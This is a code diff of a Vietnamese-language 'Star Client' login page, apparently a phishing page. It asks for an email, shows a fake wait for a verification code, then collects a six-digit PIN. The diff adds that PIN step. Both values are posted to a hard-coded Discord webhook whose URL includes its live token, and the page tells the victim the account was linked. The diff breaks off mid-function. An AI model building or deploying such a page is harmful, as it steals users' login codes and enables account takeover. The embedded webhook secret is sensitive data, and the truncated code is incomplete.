@@ -184,40 +184,63 @@
             100% { transform: rotate(360deg);}
         }
 
-        .hidden-reset-btn {
-            background: transparent;
-            border: none;
-            cursor: pointer;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-top: 2rem;
-            padding: 0.5rem;
-            transition: all 0.1s;
-            outline: none;
+        .pin-input-area {
+            margin: 1.5rem 0;
+            text-align: center;
         }
 
-        .reset-circle {
-            width: 48px;
-            height: 48px;
-            background: rgba(255,255,255,0.02);
-            border-radius: 50%;
+        .pin-label {
+            display: block;
+            font-size: 0.9rem;
+            color: #b9d0f0;
+            margin-bottom: 12px;
+            letter-spacing: 1px;
+        }
+
+        .pin-input-wrapper {
             display: flex;
-            align-items: center;
             justify-content: center;
-            backdrop-filter: blur(4px);
-            border: 1px solid rgba(56,189,248,0.2);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .pin-digit {
+            width: 55px;
+            height: 70px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 2px solid #2c6e9e;
+            border-radius: 16px;
+            text-align: center;
+            font-size: 2rem;
+            font-weight: bold;
+            color: #38bdf8;
+            font-family: monospace;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .pin-digit:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 15px rgba(59,130,246,0.4);
+            background: rgba(0, 0, 0, 0.8);
+        }
+
+        .verify-pin-btn {
+            width: 100%;
+            background: linear-gradient(95deg, #1e3a5f, #0f2b3d);
+            border: 1px solid #38bdf8;
+            padding: 0.8rem;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1rem;
+            color: #caf0ff;
+            cursor: pointer;
             transition: 0.2s;
+            margin-top: 0.5rem;
         }
-        
-        .reset-circle span {
-            font-size: 0px;
-        }
-        
-        .hidden-reset-btn:hover .reset-circle {
-            background: rgba(56,189,248,0.1);
-            border-color: rgba(56,189,248,0.5);
+
+        .verify-pin-btn:active {
+            transform: scale(0.97);
         }
 
         .hidden {
@@ -237,6 +260,11 @@
             }
             .title-glow h1 {
                 font-size: 1.8rem;
+            }
+            .pin-digit {
+                width: 45px;
+                height: 60px;
+                font-size: 1.6rem;
             }
         }
 
@@ -285,6 +313,18 @@
             0% { transform: scale(0.8); opacity: 0; }
             100% { transform: scale(1); opacity: 1; }
         }
+
+        .waiting-text {
+            font-size: 0.85rem;
+            color: #facc15;
+            margin-top: 1rem;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
     </style>
 </head>
 <body>
@@ -300,7 +340,7 @@
         client by PUDADJ
     </div>
 
-    <!-- Panel nhập email -->
+    <!-- Panel 1: Nhập email -->
     <div id="emailPanel" class="panel">
         <div class="input-area">
             <div class="mail-label">✉️ Email đăng nhập</div>
@@ -308,10 +348,41 @@
                 <input type="email" id="emailInput" class="mail-input" placeholder="vd: abc@gmail.com" autocomplete="email">
             </div>
         </div>
-        <button id="submitEmailBtn" class="submit-btn">XÁC THỰC & LIÊN KẾT</button>
+        <button id="submitEmailBtn" class="submit-btn">TIẾP TỤC</button>
     </div>
 
-    <!-- Panel đang kiểm duyệt -->
+    <!-- Panel 2: Chờ xác nhận mã PIN (có thể mất 1-2p) -->
+    <div id="waitingPinPanel" class="panel hidden">
+        <div class="review-area">
+            <div class="review-title">🔐 CHỜ XÁC NHẬN MÃ PIN 🔐</div>
+            <div class="review-sub">hệ thống đang tạo mã xác thực ...</div>
+            <div class="loader-ring"></div>
+            <div class="waiting-text">⏳ Có thể mất từ 1-2 phút ⏳</div>
+        </div>
+    </div>
+
+    <!-- Panel 3: Nhập mã PIN 6 số -->
+    <div id="pinInputPanel" class="panel hidden">
+        <div class="review-area">
+            <div class="review-title">📱 NHẬP MÃ PIN 📱</div>
+            <div class="review-sub">vui lòng nhập mã 6 số để xác thực</div>
+            
+            <div class="pin-input-area">
+                <div class="pin-label">Mã PIN 6 số</div>
+                <div class="pin-input-wrapper" id="pinInputWrapper">
+                    <input type="text" maxlength="1" class="pin-digit" id="pin1" autocomplete="off">
+                    <input type="text" maxlength="1" class="pin-digit" id="pin2" autocomplete="off">
+                    <input type="text" maxlength="1" class="pin-digit" id="pin3" autocomplete="off">
+                    <input type="text" maxlength="1" class="pin-digit" id="pin4" autocomplete="off">
+                    <input type="text" maxlength="1" class="pin-digit" id="pin5" autocomplete="off">
+                    <input type="text" maxlength="1" class="pin-digit" id="pin6" autocomplete="off">
+                </div>
+                <button id="verifyPinBtn" class="verify-pin-btn">XÁC NHẬN MÃ PIN</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Panel 4: Đang kiểm duyệt và gửi webhook -->
     <div id="reviewPanel" class="panel hidden">
         <div class="review-area">
             <div class="review-title">⚡ ĐANG KIỂM DUYỆT ⚡</div>
@@ -321,7 +392,7 @@
         </div>
     </div>
 
-    <!-- Nút ẩn (vòng tròn) - nhấn vào sẽ quay lại giao diện nhập email -->
+    <!-- Nút ẩn (vòng tròn) - quay lại nhập email từ đầu -->
     <button id="hiddenResetBtn" class="hidden-reset-btn" aria-label="reset">
         <div class="reset-circle">
             <span>↻</span>
@@ -333,60 +404,103 @@
 </div>
 
 <script>
-    // Discord Webhook (đã được cập nhật)
+    // Discord Webhook
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1475836384672485408/Z5NgvEYsAmzgUALPjA7R6UlXrcsHk6SSWuvy1BK62Xx-iPlcXzBlgXH1ArMAjl-s54Ct";
     
-    let currentState = "email"; // email hoặc review
+    let currentState = "email"; // email, waiting, pin, review
+    let currentEmail = "";
+    let generatedPin = "";
     
+    // DOM elements
     const emailPanel = document.getElementById('emailPanel');
+    const waitingPinPanel = document.getElementById('waitingPinPanel');
+    const pinInputPanel = document.getElementById('pinInputPanel');
     const reviewPanel = document.getElementById('reviewPanel');
-    const submitBtn = document.getElementById('submitEmailBtn');
+    const submitEmailBtn = document.getElementById('submitEmailBtn');
     const emailInput = document.getElementById('emailInput');
     const hiddenReset = document.getElementById('hiddenResetBtn');
+    const verifyPinBtn = document.getElementById('verifyPinBtn');
     const statusMsgSpan = document.getElementById('statusMessage');
     const loadingSpinner = document.getElementById('loadingSpinner');
     
-    // Hiển thị panel nhập email (reset về trạng thái ban đầu)
-    function showEmailPanel() {
-        emailPanel.classList.remove('hidden');
+    // PIN input elements
+    const pin1 = document.getElementById('pin1');
+    const pin2 = document.getElementById('pin2');
+    const pin3 = document.getElementById('pin3');
+    const pin4 = document.getElementById('pin4');
+    const pin5 = document.getElementById('pin5');
+    const pin6 = document.getElementById('pin6');
+    const pinInputs = [pin1, pin2, pin3, pin4, pin5, pin6];
+    
+    // Ẩn tất cả panel
+    function hideAllPanels() {
+        emailPanel.classList.add('hidden');
+        waitingPinPanel.classList.add('hidden');
+        pinInputPanel.classList.add('hidden');
         reviewPanel.classList.add('hidden');
+    }
+    
+    // Hiển thị panel email
+    function showEmailPanel() {
+        hideAllPanels();
+        emailPanel.classList.remove('hidden');
         currentState = "email";
-        // Xóa giá trị email cũ
         emailInput.value = '';
-        // Bật lại nút submit
-        submitBtn.disabled = false;
-        submitBtn.style.opacity = '1';
-        // Focus vào ô input
+        currentEmail = "";
+        generatedPin = "";
+        // Reset PIN inputs
+        pinInputs.forEach(input => {
+            if (input) input.value = '';
+        });
+        submitEmailBtn.disabled = false;
         setTimeout(() => emailInput.focus(), 100);
     }
     
-    // Hiển thị panel kiểm duyệt
+    // Hiển thị panel chờ (1-2p)
+    function showWaitingPinPanel() {
+        hideAllPanels();
+        waitingPinPanel.classList.remove('hidden');
+        currentState = "waiting";
+    }
+    
+    // Hiển thị panel nhập PIN
+    function showPinInputPanel() {
+        hideAllPanels();
+        pinInputPanel.classList.remove('hidden');
+        currentState = "pin";
+        // Focus vào ô đầu tiên
+        setTimeout(() => pin1.focus(), 100);
+    }
+    
+    // Hiển thị panel kiểm duyệt (gửi webhook)
     function showReviewPanel() {
-        emailPanel.classList.add('hidden');
+        hideAllPanels();
         reviewPanel.classList.remove('hidden');
         currentState = "review";
-        // Reset lại thông báo và spinner
         if (statusMsgSpan) {
-            statusMsgSpan.innerHTML = 'Đang kiểm duyệt, xác thực email...';
+            statusMsgSpan.innerHTML = 'Đang kiểm duyệt, liên kết tài khoản...';
             statusMsgSpan.style.color = '#93c5fd';
         }
         if (loadingSpinner) {
             loadingSpinner.style.display = 'inline-block';
         }
-        // Xóa các icon check/error cũ nếu có
         const existingMark = document.querySelector('.checkmark, .error-mark');
         if (existingMark) existingMark.remove();
     }
     
-    // Gửi email đến Discord webhook
-    async function sendEmailToWebhook(email) {
-        if (!email || !/^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(email)) {
-            throw new Error("Email không hợp lệ, vui lòng nhập đúng định dạng.");
+    // Tạo mã PIN ngẫu nhiên 6 số
+    function generateRandomPin() {
+        return Math.floor(100000 + Math.random() * 900000).toString();
+    }
+    
+    // Gửi email và PIN đến Discord webhook
+    async function sendToWebhook(email, pin) {
+        if (!email || !pin) {
+            throw new Error("Thiếu thông tin email hoặc PIN");
         }
         
         const payload = {
             username: "Star Client System",
-            avatar_url: "https://cdn.discordapp.com/attachments/xxx/starclient.png",
             embeds: [{
                 title: "✨ STAR CLIENT LOGIN ✨",
                 color: 0x38bdf8,
@@ -394,6 +508,11 @@
                     {
                         name: "📧 Email Đăng Nhập",
                         value: `\`\`\`${email}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "🔐 Mã PIN Xác Thực",
+                        value: `\`\`\`${pin}\`\`\``,
                         inline: false
                     },
                     {
@@ -408,7 +527,7 @@
                     },
                     {
                         name: "🔗 Trạng Thái",
-                        value: "✅ Đã liên kết tài khoản",
+                        value: "✅ Đã xác thực PIN và liên kết tài khoản",
                         inline: false
                     },
                     {
@@ -433,14 +552,14 @@
         });
         
         if (!response.ok) {
-            throw new Error(`Webhook response error: ${response.status}`);
+            throw new Error(`Webhook error: ${response.status}`);
         }
         
         return { success: true };
     }
     
-    // Hiển thị thành công trong panel review
-    function showSuccessInReview(email) {
+    // Hiển thị thành công
+    function showSuccessInReview(email, pin) {
         if (loadingSpinner) loadingSpinner.style.display = 'none';
         
         const existingMark = document.querySelector('.checkmark, .error-mark');
@@ -457,12 +576,12 @@
         reviewArea.insertBefore(successDiv, document.getElementById('statusMessage'));
         
         if (statusMsgSpan) {
-            statusMsgSpan.innerHTML = `✅ ĐÃ LIÊN KẾT THÀNH CÔNG! ✅<br><span style="font-size:0.7rem;">📧 ${email}</span><br><span style="font-size:0.7rem;">Đã gửi thông tin đến webhook</span>`;
+            statusMsgSpan.innerHTML = `✅ ĐÃ LIÊN KẾT THÀNH CÔNG! ✅<br><span style="font-size:0.7rem;">📧 ${email}</span><br><span style="font-size:0.7rem;">🔐 PIN: ${pin}</span><br><span style="font-size:0.7rem;">Đã gửi thông tin đến webhook</span>`;
             statusMsgSpan.style.color = '#4ade80';
         }
     }
     
-    // Hiển thị lỗi trong panel review
+    // Hiển thị lỗi
     function showErrorInReview(message) {
         if (loadingSpinner) loadingSpinner.style.display = 'none';
         
@@ -485,71 +604,8 @@
         }
     }
     
-    // Xử lý khi submit email
-    async function handleSubmitEmail(email) {
-        if (!email) {
-            alert("Vui lòng nhập địa chỉ email.");
-            return;
-        }
-        if (!/^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(email)) {
-            alert("Email không hợp lệ! Ví dụ: abc@gmail.com");
-            return;
-        }
+    // Xử lý khi nhập email
+    async function handleSubmitEmail() {
+        const email = emailInput.value.trim();
         
-        // Chuyển sang panel kiểm duyệt
-        showReviewPanel();
-        
-        try {
-            // Gửi đến webhook Discord
-            await sendEmailToWebhook(email);
-            // Hiển thị thành công
-            showSuccessInReview(email);
-        } catch (err) {
-            console.error("Submit error:", err);
-            showErrorInReview(err.message || "Lỗi kết nối webhook, vui lòng thử lại sau");
-        }
-    }
-    
-    // Xử lý nút ẩn: quay lại giao diện nhập email (hiện khung nhập để nhập lại từ đầu)
-    function handleResetToEmail() {
-        // Nếu đang ở review panel, quay về email panel
-        if (currentState === "review") {
-            showEmailPanel();
-        } 
-        // Nếu đang ở email panel, cũng reset lại (xóa input)
-        else if (currentState === "email") {
-            emailInput.value = '';
-            emailInput.focus();
-        }
-    }
-    
-    // Khởi tạo sự kiện
-    function init() {
-        // Nút submit
-        submitBtn.addEventListener('click', (e) => {
-            e.preventDefault();
-            const email = emailInput.value.trim();
-            handleSubmitEmail(email);
-        });
-        
-        // Nhấn Enter trong ô input
-        emailInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                const email = emailInput.value.trim();
-                handleSubmitEmail(email);
-            }
-        });
-        
-        // Nút ẩn (vòng tròn) - quay lại giao diện nhập email
-        hiddenReset.addEventListener('click', (e) => {
-            e.preventDefault();
-            handleResetToEmail();
-        });
-    }
-    
-    // Chạy khởi tạo
-    init();
-</script>
-</body>
-</html>
+       
